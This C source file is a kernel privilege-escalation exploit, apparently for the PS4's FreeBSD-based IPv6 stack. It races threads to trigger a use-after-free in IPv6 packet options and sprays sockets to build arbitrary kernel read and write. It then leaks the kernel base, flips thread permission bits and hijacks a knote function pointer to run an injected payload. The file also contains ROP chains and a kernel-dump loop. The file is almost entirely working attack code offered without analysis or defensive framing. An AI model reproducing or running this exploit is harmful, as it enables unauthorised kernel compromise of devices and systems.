#include <sys/types.h>
#define _KERNEL
#include <sys/event.h>
//#include <sys/proc.h>
//#include <sys/filedesc.h>
__BEGIN_DECLS // haven't been included because of _KERNEL
int     kqueue(void);
int     kevent(int kq, const struct kevent *changelist, int nchanges,
	    struct kevent *eventlist, int nevents,
	    const struct timespec *timeout);
__END_DECLS
#undef _KERNEL
#include <errno.h>
#ifdef __PS4__
#include <printf/printf.h>
#include <ps4/mmap.h>
#include <ps4/errno.h>
#else
#include <stdio.h>
#include <sys/mman.h>
#endif
#include <ps4/saveall.h>
#include <librop/pthread_create.h>
#include <librop/extcall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet6/ip6_var.h>
#include <time.h>
#include <unistd.h>
#include <stddef.h>
#include <signal.h>
#include <fcntl.h>

#define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)

#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25

// ps4-rop-8cc generates thread-unsafe code, so each racing thread needs its own get_tclass function
#define GET_TCLASS(name) int name(int s)\
{\
    int v;\
    socklen_t l = sizeof(v);\
    if(getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l))\
        *(volatile int*)0;\
    return v;\
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

int set_tclass(int s, int val)
{
    if(setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
        *(volatile int*)0;
}

#define TCLASS_MASTER 0x13370000
#define TCLASS_MASTER_2 0x73310000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s) set_pktopts(s, NULL, 0)

int get_rthdr(int s, char* buf, int len)
{
    socklen_t l = len;
    if(getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
        *(volatile int*)0;
    return l;
}

#define set_pktinfo(s, buf) setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))

int get_pktinfo(int s, char* buf)
{
    socklen_t l = sizeof(struct in6_pktinfo);
    if(getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
        *(volatile int*)0;
    return l;
}

struct opaque
{
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock;
    int kevent_sock;
    int* spray_sock;
    int* kq;
};

void* use_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    char buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr* cmsg = (struct cmsghdr*)buf;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = IPPROTO_IPV6;
    cmsg->cmsg_type = IPV6_TCLASS;
    *(int*)CMSG_DATA(cmsg) = 0;
    while(!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
        if(set_pktopts(o->master_sock, buf, sizeof(buf)))
            *(volatile int*)0;
    o->triggered = 1;
    o->done1 = 1;
}

void* free_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    while(!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY)
    {
        if(free_pktopts(o->master_sock))
            *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    o->triggered = 1;
    o->done2 = 1;
}

void trigger_uaf(struct opaque* o)
{
    o->triggered = o->padding = o->done1 = o->done2 = 0;
    int qqq[256];
    pthread_create(qqq, NULL, use_thread, o);
    pthread_create(qqq+128, NULL, free_thread, o);
    for(;;)
    {
        for(int i = 0; i < 32; i++)
            set_tclass(o->spray_sock[i], TCLASS_SPRAY);
        if(get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;
        for(int i = 0; i < 32; i++)
            if(free_pktopts(o->spray_sock[i]))
                *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100 us
    }
    printf("uaf: %d\n", get_tclass(o->master_sock) - TCLASS_SPRAY);
    o->triggered = 1;
    while(!o->done1 || !o->done2);
}

int build_rthdr_msg(char* buf, int size)
{
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo)
{
    free_pktopts(overlap_sock);
    char buf[0x100] = {0};
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;
    for(;;)
    {
        for(int i = 0; i < 32; i++)
        {
            *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
            *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
            if(set_rthdr(o->spray_sock[i], buf, l))
                *(volatile int*)0;
        }
        tclass = get_tclass(o->master_sock);
        if((tclass & 0xffff0000) == tclass0)
            break;
        for(int i = 0; i < 32; i++)
            if(set_rthdr(o->spray_sock[i], NULL, 0))
                *(volatile int*)0;
    }
    return tclass & 0xffff;
}

unsigned long long leak_kmalloc(int master_sock, int overlap_sock, char* buf, int sz)
{
    int l = build_rthdr_msg(buf, sz);
    if(set_rthdr(master_sock, buf, l))
        *(volatile int*)0;
    char buf2[256];
    get_rthdr(overlap_sock, buf2, 256);
    return *(unsigned long long*)(buf2 + PKTOPTS_RTHDR_OFFSET);
}

void leak_kevent_pktopts(struct opaque* o, int overlap_sock, unsigned long long* ptrs)
{
    char buf[0x800];
    struct kevent kv;
    EV_SET(&kv, o->kevent_sock, EVFILT_READ, EV_ADD, 0, 5, NULL);
    ptrs[0] = leak_kmalloc(o->master_sock, overlap_sock, buf, 0x800);
    if(set_rthdr(o->master_sock, NULL, 0))
        *(volatile int*)0;
    for(int i = 0; i < 256; i++)
        kevent(o->kq[i], &kv, 1, 0, 0, 0);
    printf("kevent_addr = 0x%llx\n", ptrs[0]);
    for(int i = 0; i < 256; i++)
        free_pktopts(o->spray_sock[i]);
    ptrs[1] = leak_kmalloc(o->master_sock, overlap_sock, buf, 0x100);
    if(set_rthdr(o->master_sock, NULL, 0))
        *(volatile int*)0;
    for(int i = 0; i < 256; i++)
        set_tclass(o->spray_sock[i], 0);
    printf("pktopts_addr = 0x%llx\n", ptrs[1]);
}

void write_to_victim(struct opaque* o, unsigned long long addr)
{
    char buf[sizeof(struct in6_pktinfo)];
    get_pktinfo(o->master_sock, buf);
    *(unsigned long long*)buf = addr;
    //*(unsigned long long*)(buf+8) = 0;
    //*(unsigned int*)(buf+16) = 0;
    if(set_pktinfo(o->master_sock, buf))
        *(volatile int*)0;
}

int find_victim_sock(struct opaque* o, unsigned long long pktopts_addr)
{
    char buf[sizeof(struct in6_pktinfo)];
    write_to_victim(o, pktopts_addr + PKTOPTS_PKTINFO_OFFSET);
    for(int i = 0; i < 256; i++)
    {
        *(unsigned long long*)buf = 0;
        get_pktinfo(o->spray_sock[i], buf);
        if(*(unsigned long long*)buf)
            return i;
    }
    return -1;
}

unsigned long long kread64(struct opaque* o, int victim_sock, unsigned long long k)
{
    char buf[sizeof(struct in6_pktinfo)];
    write_to_victim(o, k);
    get_pktinfo(victim_sock, buf);
    return *(unsigned long long*)buf;
}

void kwrite64(struct opaque* o, int victim_sock, unsigned long long k, unsigned long long v)
{
    char buf[sizeof(struct in6_pktinfo)];
    write_to_victim(o, k);
    get_pktinfo(victim_sock, buf);
    *(unsigned long long*)buf = v;
    write_to_victim(o, k);
    if(set_pktinfo(victim_sock, buf))
        *(volatile int*)0;
}

unsigned long long __builtin_gadget_addr(const char*);

void sidt(unsigned long long* addr, unsigned short* size)
{
    char buf[10];
    unsigned long long ropchain[14] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        ropchain+13,
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ull,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        0x7d,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("sidt [rax - 0x7d]"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(char*))ropchain)(buf);
    *size = *(unsigned short*)buf;
    *addr = *(unsigned long long*)(buf+2);
}

void dump_kernel(struct opaque* o, int victim, unsigned long long base, int ufo)
{
    for(;;)
    {
        unsigned long long buf[32];
        for(int i = 0; i < 32; i++)
            buf[i] = kread64(o, victim, base + 8*i);
        char* b = (char*)buf;
        int sz = 256;
        while(sz > 0)
        {
            int chk = write(ufo, b, sz);
            if(chk < 0)
                break;
            b += chk;
            sz -= chk;
        }
        base += 256;
    }
}

unsigned long long leak_kmalloc_v(struct opaque* o, int victim, unsigned long long pktopts_addr, char* buf, int sz)
{
    if(set_rthdr(victim, NULL, 0))
        *(volatile int*)0;
    int l = build_rthdr_msg(buf, sz);
    if(set_rthdr(victim, buf, l))
        *(volatile int*)0;
    unsigned long long addr = kread64(o, victim, pktopts_addr + PKTOPTS_RTHDR_OFFSET);
    kwrite64(o, victim, pktopts_addr + PKTOPTS_RTHDR_OFFSET, 0);
    if(set_rthdr(victim, NULL, 0))
        *(volatile int*)0;
    return addr;
}

#ifdef __PS4__
#define F_DETACH_OFFSET 0x3d68e0
#define EBFE_OFFSET 0xe97e0
#define CLIHLT_OFFSET 0x1fa239
#define READ_CR0_OFFSET 0xa1b70 // mov rax, cr0 ; or rax, 0x5002a ; mov cr0, rax
//syscall entry 0x1c0
//sysent #11 offset 0x111e210
#else // stock fbsd9
#define F_DETACH_OFFSET 0x69b720
#define EBFE_OFFSET 0x6326f4
#define CLIHLT_OFFSET 0x26ba18
#define READ_CR0_OFFSET 0x9071e0
#endif

void* closer_thread(void* arg)
{
    struct opaque* o = (struct opaque*)arg;
    for(int i = 0; i < 256; i++)
        close(o->kq[i]);
    o->triggered = new_socket();
}

#ifdef __PS4__
int getpid_via_fork()
{
    unsigned long long ropchain[27] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        ropchain+26,
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ull,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("pop rax"),
        ropchain+22,
        __builtin_gadget_addr("mov [rax], rdi"),
        __builtin_gadget_addr("pop rdi"),
        ropchain+22, //24-2
        __builtin_gadget_addr("mov [rdi + 0x10], r8"),
        __builtin_gadget_addr("pop rax"),
        20,
        __builtin_gadget_addr("$fork_addr + 10"),
        __builtin_gadget_addr("pop rsi"),
        ropchain+20,
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rcx"),
        0,
        __builtin_gadget_addr("pop rdi"),
        0,
        __builtin_gadget_addr("pop r8"),
        0,
        __builtin_gadget_addr("pop rsp"),
        0
    };
    return ((unsigned long long(*)())ropchain)();
}
#endif

unsigned long long find_struct_proc(struct opaque* o, int victim, unsigned long long kernel_base)
{
    int pid = getpid();
    unsigned long long proc = kread64(o, victim, kernel_base + 0x22bbe80);
    while(proc && pid != (int)kread64(o, victim, proc + 0xb0))
        proc = kread64(o, victim, proc);
    return proc;
}

int jitshm_create(int flags, unsigned long long size, int prot);
int jitshm_alias(int fd, int prot);

int main()
{
    if(!setuid(0))
        return 179;
    char not_close[4096] = {0};
    int tmp;
#define TAINTFD(x) do { tmp = x; not_close[tmp] = 1; } while(0)
#define NEWSOCK(x) do { x = tmp = new_socket(); not_close[tmp] = 1; } while(0)
    unsigned long long idt_base;
    unsigned short idt_size;
    sidt(&idt_base, &idt_size);
    printf("sidt = 0x%hx 0x%llx\n", idt_size, idt_base);
    int kevent_sock;
    NEWSOCK(kevent_sock);
    int master_sock;
    NEWSOCK(master_sock);
    int spray_sock[256], kq[256];
    int q1 = 0, q2 = 0;
    for(int i = 0; i < 256; i++)
    {
        NEWSOCK(spray_sock[i]);
        q1 += spray_sock[i];
    }
    for(int i = 0; i < 256; i++)
    {
        q2 += (kq[i] = kqueue());
        //TAINTFD(kq[i]); // gets closed down the road, so no need
    }
    printf("sockets=%d kqueues=%d\n", q1, q2);
    struct opaque o = {.master_sock = master_sock, .kevent_sock = kevent_sock, .spray_sock = spray_sock, .kq = kq};
    trigger_uaf(&o);
    printf("uaf ok!\n");
    set_tclass(master_sock, TCLASS_TAINT);
    int overlap_idx = -1;
    for(int i = 0; i < 256; i++)
        if(get_tclass(spray_sock[i]) == TCLASS_TAINT)
            overlap_idx = i;
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    int overlap_sock = spray_sock[overlap_idx];
    int cleanup1 = overlap_sock;
    NEWSOCK(spray_sock[overlap_idx]);
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, 0);
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    overlap_sock = spray_sock[overlap_idx];
    int cleanup2 = overlap_sock;
    NEWSOCK(spray_sock[overlap_idx]);
    unsigned long long ptrs[2];
    int victim;
    leak_kevent_pktopts(&o, overlap_sock, ptrs);
    set_rthdr(overlap_sock, NULL, 0); // clean up from the previous spray
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER_2, ptrs[1] + PKTOPTS_PKTINFO_OFFSET);
    printf("overlap_idx = %d\n", overlap_idx);
    if(overlap_idx < 0)
        return 1;
    overlap_sock = spray_sock[overlap_idx];
    NEWSOCK(spray_sock[overlap_idx]);
    victim = find_victim_sock(&o, ptrs[1]);
    printf("victim_idx = %d\n", victim);
    if(victim < 0)
        return 1;
    victim = spray_sock[victim];
    unsigned long long knote, kn_fop, f_detach, kernel_base = 1;
    for(int i = 0; i < 10 && kernel_base & 4095ull; i++)
    {
        knote = kread64(&o, victim, ptrs[0] + kevent_sock * 8);
        kn_fop = kread64(&o, victim, knote + offsetof(struct knote, kn_fop));
        f_detach = kread64(&o, victim, kn_fop + offsetof(struct filterops, f_detach));
        kernel_base = f_detach - F_DETACH_OFFSET;
    }
    if(kernel_base & 4095ull)
    {
        printf("error: kernel base mismatch: 0x%llx! (buggy arb r/w? wrong fw?)\n", kernel_base);
        //kernel_base = idt_base - 0x1bbb9e0; // fallback
        return 1;
    }
    printf("kernel_base = 0x%llx\n", kernel_base);
    printf("f_detach = 0x%llx, offset = 0x%llx\n", f_detach, F_DETACH_OFFSET);
    unsigned long long struct_proc = find_struct_proc(&o, victim, kernel_base);
    printf("struct_proc = 0x%llx\n", struct_proc);
    printf("getpid() = 0x%x\n", getpid());
    unsigned long long sysent_base = kernel_base + 0x111e000;
    // enable jitshm
    unsigned long long struct_thread = kread64(&o, victim, struct_proc+0x10);
    unsigned long long thread_0x130 = kread64(&o, victim, struct_thread+0x130);
    unsigned long long thread_0x130_0x68 = kread64(&o, victim, thread_0x130+0x68);
    thread_0x130_0x68 |= __builtin_gadget_addr("dq 0x2000000000000000");
    kwrite64(&o, victim, thread_0x130+0x68, thread_0x130_0x68);
    int jit1, jit2;
    errno = 0;
    jit1 = jitshm_create(0, 16384, PROT_READ|PROT_WRITE|PROT_EXEC);
    jit2 = jitshm_alias(jit1, PROT_READ|PROT_WRITE);
    printf("jit: %d %d\n", jit1, jit2);
    char* page_rx = mmap(NULL, 16384, PROT_READ|PROT_EXEC, MAP_SHARED, jit1, 0);
    thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x2000000000000000");
    thread_0x130_0x68 |= __builtin_gadget_addr("dq 0x4000000000000000");
    kwrite64(&o, victim, thread_0x130+0x68, thread_0x130_0x68);
    char* page_rw = mmap(NULL, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|0xf, jit2, 0);
    thread_0x130_0x68 &= ~__builtin_gadget_addr("dq 0x4000000000000000");
    kwrite64(&o, victim, thread_0x130+0x68, thread_0x130_0x68);
    printf("rx=0x%llx rw=0x%llx\n", page_rx, page_rw);
    // enable fork
    unsigned long long thread_0x130_0x60 = kread64(&o, victim, thread_0x130+0x60);
    thread_0x130_0x60 |= __builtin_gadget_addr("dq 0x4000000000000000");
    kwrite64(&o, victim, thread_0x130+0x60, thread_0x130_0x60);
    // load assembly payload
#include "inline_asm.c"
    *(unsigned long long*)(page_rw+4056) = f_detach;
    *(unsigned long long*)(page_rw+4064) = kn_fop;
    *(unsigned long long*)(page_rw+4072) = kernel_base;
    *(int*)(page_rw+4084) = master_sock;
    *(int*)(page_rw+4088) = overlap_sock;
    *(int*)(page_rw+4092) = victim;
    printf("page_rx[0] = 0x%x\n", page_rx[0]);
    unsigned long long fake_kn_fop[5] = {
        kread64(&o, victim, kn_fop),
        kread64(&o, victim, kn_fop+8),
        kread64(&o, victim, kn_fop+16),
        kread64(&o, victim, kn_fop+24),
        kread64(&o, victim, kn_fop+32)
    };
    *(unsigned long long*)(((char*)fake_kn_fop)+offsetof(struct filterops, f_detach)) = page_rx;
    kwrite64(&o, victim, knote + offsetof(struct knote, kn_fop), fake_kn_fop);
    write_to_victim(&o, 0);
    for(int i = 0; i < 256; i++)
        close(kq[i]);
    // fix crash in webkit after running this
    close(jit1);
    close(jit2);
    if(!fork())
    {
        struct sigaction ignore = {
            .sa_handler = SIG_IGN,
            .sa_mask = 0,
            .sa_flags = 0
        };
        sigaction(SIGTERM, &ignore);
        sigaction(SIGKILL, &ignore);
        /*for(int i = 0; i < 8; i++)
            close(i);*/
        for(int i = 0; i < 4096; i++)
            if(!not_close[i])
                if(!close(i))
                    printf("closed fd %d\n", i);
        for(;;)
            nanosleep("\xe8\x03\0\0\0\0\0\0\0\0\0\0\0\0\0\0", NULL);
    }
    return 0;
}
